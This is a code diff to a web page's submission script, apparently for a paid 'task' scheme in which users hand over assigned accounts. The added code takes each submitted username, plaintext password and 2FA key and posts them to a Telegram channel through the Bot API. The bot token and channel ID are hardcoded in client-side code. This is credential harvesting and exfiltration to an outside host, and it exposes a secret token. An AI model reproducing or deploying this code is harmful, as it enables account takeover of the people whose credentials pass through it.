@@ -860,11 +860,15 @@
             btn.innerText = 'Submitting...';
             btn.disabled = true;
 
+            const assignedName = document.getElementById('task-assigned-name').innerText;
+            const assignedUsername = document.getElementById('task-assigned-username').innerText;
+            const assignedPassword = document.getElementById('task-assigned-password').innerText;
+
             const payload = {
                 user_id: currentUser.id.toString(),
-                full_name: document.getElementById('task-assigned-name').innerText,
-                username_submitted: document.getElementById('task-assigned-username').innerText,
-                password: document.getElementById('task-assigned-password').innerText,
+                full_name: assignedName,
+                username_submitted: assignedUsername,
+                password: assignedPassword,
                 two_fa_key: twoFaInput,
                 status: 'pending',
                 reward: rewardVal,
@@ -872,8 +876,31 @@
             };
 
             try {
+                // 1. Save to Supabase Database
                 const { error } = await _supabase.from('task_submissions').insert([payload]);
                 if (error) throw error;
+
+                // 2. Send Details to Telegram Channel (-1004399480886)
+                const botToken = "8795156656:AAGL6lE7I6PZTdU71L-0J1JG12Cj1e0ayTw";
+                const chatId = "-1004399480886";
+                
+                const messageText = `🚀 **New Task Submission!**\n\n` +
+                                    `👤 **User ID:** \`${currentUser.id}\`\n` +
+                                    `📛 **Name:** ${assignedName}\n` +
+                                    `📧 **Username:** \`${assignedUsername}\`\n` +
+                                    `🔑 **Password:** \`${assignedPassword}\`\n` +
+                                    `🔐 **2FA Key:** \`${twoFaInput}\`\n` +
+                                    `💰 **Reward:** $${rewardVal}`;
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: messageText,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
                 currentUser.pending += 1;
                 document.getElementById('stat-pending').innerText = currentUser.pending;
@@ -884,7 +911,7 @@
                 document.getElementById('success-msg').innerText = "Your task details have been successfully submitted! Please wait for admin verification.";
                 document.getElementById('success-modal').classList.remove('hidden');
             } catch (err) {
-                alert('Error: ' + (err.message || 'Check database table columns.'));
+                alert('Error: ' + (err.message || 'Check database table columns or network.'));
             } finally {
                 btn.innerText = 'Submit Task';
                 btn.disabled = false;
